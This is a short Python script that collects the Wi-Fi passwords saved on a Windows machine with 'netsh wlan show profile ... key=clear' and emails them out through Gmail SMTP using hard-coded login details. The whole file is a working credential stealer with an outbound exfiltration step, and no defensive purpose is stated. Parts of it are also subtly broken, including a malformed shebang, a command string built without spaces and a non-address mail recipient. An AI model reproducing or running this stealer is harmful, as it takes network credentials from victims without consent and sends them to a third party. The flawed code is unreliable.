#!usr/bin/env python
import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail("sunday4me@gmail.com", "SundayJimoh", message)
    server.quit()


# command = "netsh wlan show profile network_name key=clear"
command = "netsh wlan show profile"
# subprocess.Popen(command, shell=True)
# result = subprocess.check_output(command, shell=True)
networks = subprocess.check_output(command, shell=True)
# network_names = re.search("(?:profile\s*:\s)(.*)",networks)
# network_names = re.findall("(?:profile\s*:\s)(.*)",networks)
network_names_lists = re.findall("(?:profile\s*:\s)(.*)",networks)
# print(network_names_lists)
result = " "
for network_name in network_names_lists:
    # print(network_name)
    command = "netsh wlan show profile" + network_name + "key =clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail("sunday4me@gmail.com", "Sunday", result)

